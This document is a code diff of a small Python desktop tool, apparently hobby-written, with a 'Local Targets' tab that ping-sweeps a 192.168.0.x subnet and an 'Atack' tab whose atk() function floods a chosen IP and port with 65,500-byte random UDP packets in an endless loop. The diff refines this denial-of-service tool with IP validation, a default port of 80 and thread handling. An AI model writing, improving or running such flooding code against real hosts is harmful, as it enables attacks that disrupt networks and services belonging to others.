@@ -1,12 +1,10 @@
 import socket
 import random
-import time
 import threading
 import customtkinter
-import os
+import re
 
 from ping3 import ping
-from PIL import Image
 from colorama import Fore, Back, Style
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -15,32 +13,34 @@ def writeTargetsInTextBox():
      netAddr = "192.168.0." #potentiell variabel
      global textBoxTargets, isSearchAktive, findTargetsButton,SearchProgress, terminateSearch
      terminateSearch = False
-     findTargetsButton.configure(text = "End Search")
+     findTargetsButton.configure(text="End Search")
      textBoxTargets.delete("0.0", "end")
      line = 0
      for i in range(1,255):
           if terminateSearch:
-               break
+               return 0
 
           SearchProgress.set(i/254)
           ip = netAddr + str(i)
-          #print("scanning: " + str(ip))
+          print("scanning: " + str(ip))
           isthere = ping(ip, timeout=0.2)
           if isthere:
                try:
                     hostName = socket.gethostbyaddr(ip)
                     textBoxTargets.insert("0."+str(line), ip + ":\t" + hostName[0] + "\n")
                except:
-                    textBoxTargets.insert("0."+str(line), ip + "\n")
+                    textBoxTargets.insert("0."+str(line), ip + ":\n")
 
                line = line + 1
 
+     resetLayout()
      print("ende")
-     isSearchAktive = False
-     print("hi2")
-     findTargetsButton.configure(text = "Start Search")
-     print("hi3")
+
+def resetLayout():
+     global findTargetsButton,SearchProgress, isSearchAktive
+     findTargetsButton.configure(text="Find Targets")
      SearchProgress.set(0)
+     isSearchAktive = False
 
 def startSearch():
      global searchThread, isSearchAktive
@@ -51,28 +51,46 @@ def startSearch():
 def endSearch():
      global searchThread, isSearchAktive, terminateSearch
      terminateSearch = True
-     if isSearchAktive:
-          searchThread.join()
+     resetLayout()
+     
 
-def toggelSearch():
+def togleSearch():
      global isSearchAktive
      if isSearchAktive:
           endSearch()
      else:
           startSearch()
 
+def isIPValid(ip):
+     ipArray = ip.split(".")
+     if len(ipArray) != 4:
+          return False
+     for oktet in ipArray:
+          if int(oktet) > 255 or int(oktet) < 1:
+               return False
+     
+     return True
+
 def atk():
      global isActive, entryIp, entryPort
      bytes = random._urandom(65500)
      ip = entryIp.get()
-     port = int(entryPort.get())
+     try:
+          port = int(entryPort.get())
+     except:
+          port = 80
+
      i = 0
      while isActive:
           sock.sendto(bytes,(ip, port))
+          print("send package " + str(i))
           i = i + 1
 
 def startAtk():
-     global atkThread, isActive, startButton
+     global atkThread, isActive, startButton, entryIp
+     if not isIPValid(entryIp.get()):
+          return 0
+     
      atkThread = threading.Thread(target=atk)
      isActive = True
      startButton.configure(text = "Stop Atack")
@@ -111,11 +129,9 @@ customtkinter.set_default_color_theme("green")
 
 root = customtkinter.CTk()
 root.protocol("WM_DELETE_WINDOW", cleanUp)
-root.title("DSL")
+root.title("DLS")
 root.geometry("500x400")
 
-#bgImage=customtkinter.CTkImage(dark_image=Image.open("maxresdefault.jpg"), size=(500, 400))
-#bgLabel = customtkinter.CTkLabel(root, text = "",image=bgImage)
 tabview = customtkinter.CTkTabview(master=root)
 
 tabview.add("Atack")
@@ -133,7 +149,7 @@ frameTarget = customtkinter.CTkFrame(master=tabview.tab("Local Targets"))
 textBoxTargets = customtkinter.CTkTextbox(master=frameTarget, height=200, width = 350)
 SearchProgress = customtkinter.CTkProgressBar(frameTarget, orientation="horizontal")
 SearchProgress.set(0)
-findTargetsButton = customtkinter.CTkButton(master=frameTarget, text="Start Search", command=toggelSearch)
+findTargetsButton = customtkinter.CTkButton(master=frameTarget, text="toggle search", command=togleSearch)
 
 #atk Tab
 tabview.pack()
